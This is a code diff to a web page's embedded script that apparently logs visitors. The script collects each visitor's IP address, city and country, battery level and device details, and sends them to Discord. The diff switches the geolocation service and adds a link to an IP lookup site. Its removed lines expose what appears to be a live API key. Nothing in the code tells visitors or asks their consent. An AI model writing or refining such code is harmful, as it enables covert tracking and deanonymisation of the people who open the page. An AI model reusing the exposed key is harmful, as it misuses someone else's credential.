@@ -36,10 +36,16 @@
         }
 
         function getLocation(ip) {
-            const apiKey = 'ipl_live_TrMYUZ4xSg3eTqWeS3fkWz1mZhG45lOq9fFGI7mD';
-            return fetch(`https://api.iplookupapi.com/v1?apiKey=${apiKey}&ip=${ip}`)
+            const url = ip ? `https://freeipapi.com/api/json/${ip}` : `https://freeipapi.com/api/json/`;
+            return fetch(url)
                 .then(response => response.json())
-                .catch(error => console.error('Error fetching location:', error));
+                .then(data => {
+                    return `${data.city}, ${data.countryName}`;
+                })
+                .catch(error => {
+                    console.error('Error fetching location:', error);
+                    return 'Location unknown';
+                });
         }
 
         function getBatteryInfo() {
@@ -79,7 +85,8 @@
                         { name: "IP Address", value: ip, inline: true },
                         { name: "Location", value: location || 'N/A', inline: true },
                         { name: "Battery Level", value: battery, inline: true },
-                        { name: "Device Info", value: deviceInfo, inline: false }
+                        { name: "Device Info", value: deviceInfo, inline: false },
+                        { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ip}` }
                     ],
                     footer: { text: `Logged at ${new Date().toLocaleString()}` }
                 }]
@@ -102,8 +109,7 @@
             .then(([ip, battery]) => {
                 const deviceInfo = getDeviceInfo();
                 getLocation(ip).then(location => {
-                    const locationInfo = location ? `${location.city}, ${location.country_name}` : 'Unknown';
-                    sendToDiscord(ip, locationInfo, battery, deviceInfo);
+                    sendToDiscord(ip, location, battery, deviceInfo);
                 });
             });
     </script>
